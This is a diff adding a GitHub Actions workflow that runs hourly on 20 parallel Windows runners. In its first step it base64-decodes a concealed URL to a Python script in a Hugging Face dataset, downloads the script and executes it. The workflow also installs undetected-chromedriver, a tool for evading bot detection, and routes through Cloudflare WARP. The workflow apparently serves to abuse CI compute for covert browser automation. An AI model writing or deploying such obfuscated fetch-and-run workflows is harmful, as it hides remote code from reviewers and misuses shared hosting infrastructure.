@@ -1,0 +1,70 @@
+name: Multi-Threaded Task Runner
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+concurrency:
+  group: cluster-pool-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  execute-workload:
+    name: "Client-${{ matrix.instance_id }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        instance_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      - name: Provision Host & Fetch Target Script
+        shell: bash
+        run: |
+          echo "[STATUS] Setting up Client-${{ matrix.instance_id }}..."
+          
+          # فك تشفير الرابط المصدر وتحميل ملف التشغيل
+          FETCH_SRC_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvbmdyaWsvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$FETCH_SRC_URL" -o execute_app.py
+          
+          echo "[STATUS] Configuring environment packages..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[STATUS] Workspace readiness confirmed."
+
+      - name: Trigger Process & Monitor Lifecycle
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output ">>> Launching process on Client ${{ matrix.instance_id }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ExecutionConfig = @{
+              FilePath     = "python"
+              ArgumentList = "execute_app.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $RunningTask = Start-Process @ExecutionConfig
+          
+          Write-Output ">>> Safety timeout handler active (74m maximum)."
+          
+          try {
+              Wait-Process -InputObject $RunningTask -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Task completed smoothly within limits."
+          }
+          catch {
+              Write-Output ">>> Execution window expired! Forcing shutdown..."
+              Stop-Process -InputObject $RunningTask -Force
+              Write-Output ">>> Process terminated by watchdog."
+          }
+
+      - name: Cleanup Step
+        shell: bash
+        run: echo "[STATUS] Client-${{ matrix.instance_id }} operations finished."
